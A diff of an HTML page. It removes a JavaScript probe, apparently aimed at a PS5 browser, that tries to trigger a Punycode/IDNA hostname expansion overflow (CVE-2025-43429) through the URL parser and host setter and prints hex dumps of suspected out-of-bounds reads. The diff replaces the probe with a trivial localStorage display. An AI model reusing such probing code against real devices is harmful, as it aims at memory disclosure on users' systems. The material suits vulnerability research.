@@ -1,96 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>PS5 CVE-2025-43429 - High Expansion Punycode Overflow</title>
-</head>
 <body>
-<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
+<div id="r"></div>
 <script>
-const L = s => { document.getElementById('log').textContent += s + '\n'; };
-
-L('[*] Starting CVE-2025-43429 High Expansion Punycode Overflow...');
-
-// Characters that expand massively in Punycode/IDNA
-const expanders = [
-    { name: 'FB03 (ffi, 3x)', char: '\uFB03' },
-    { name: 'FB01 (fi, 2x)', char: '\uFB01' },
-    { name: '212B (Angstrom, 2x)', char: '\u212B' },
-    { name: '3371 (hPa, 3x)', char: '\u3371' },
-];
-
-for (const exp of expanders) {
-    L('\n--- Testing ' + exp.name + ' ---');
-    
-    // Test sizes from 500 to 1500
-    for (let size = 500; size <= 1500; size += 100) {
-        try {
-            let domain = exp.char.repeat(size) + '.com';
-            let url = new URL('http://' + domain);
-            
-            let hn = url.hostname;
-            L('[+] Size ' + size + ': OK. Hostname length: ' + hn.length);
-            
-            // If hostname length > 2048, we definitely triggered the OOB read
-            if (hn.length > 2048) {
-                L('[!] OVER 2048! OOB READ CONFIRMED!');
-                let hex = [];
-                for (let i = 0; i < hn.length; i++) {
-                    hex.push(hn.charCodeAt(i).toString(16).padStart(2, '0'));
-                }
-                L('[!] Hex dump (last 100 chars): ' + hex.slice(-100).join(' '));
-                L('[!] THIS IS THE LEAK!');
-                break;
-            }
-            
-            // Check for anomalies (non-ASCII or control chars in Punycode)
-            let anomalies = 0;
-            for (let i = 0; i < hn.length; i++) {
-                let code = hn.charCodeAt(i);
-                if (code > 127 || (code < 32 && code !== 45 && code !== 46)) {
-                    anomalies++;
-                }
-            }
-            if (anomalies > 0) {
-                L('[!] ANOMALIES DETECTED! ' + anomalies + ' non-ASCII chars!');
-            }
-            
-        } catch (e) {
-            if (e.message.includes('cannot be parsed')) {
-                L('[-] Size ' + size + ': Rejected by URL parser');
-            } else {
-                L('[!] Size ' + size + ': ERROR: ' + e.message);
-            }
-        }
-    }
-}
-
-// Also try via URL.host setter
-L('\n--- Testing via URL.host setter ---');
-for (const exp of expanders) {
-    L('\n--- Setter: ' + exp.name + ' ---');
-    try {
-        let domain = exp.char.repeat(1000) + '.com';
-        let url = new URL('http://example.test/');
-        url.host = domain;
-        
-        let hn = url.hostname;
-        L('[+] Setter size 1000: OK. Hostname length: ' + hn.length);
-        
-        if (hn.length > 2048) {
-            L('[!] SETTER OVER 2048! OOB READ CONFIRMED!');
-            let hex = [];
-            for (let i = 0; i < hn.length; i++) {
-                hex.push(hn.charCodeAt(i).toString(16).padStart(2, '0'));
-            }
-            L('[!] Hex dump (last 100 chars): ' + hex.slice(-100).join(' '));
-        }
-    } catch (e) {
-        L('[!] Setter threw: ' + e.message);
-    }
-}
-
-L('\n[*] Test finished.');
+document.getElementById("r").textContent = localStorage.getItem('prop_test') || 'EMPTY';
 </script>
 </body>
 </html>
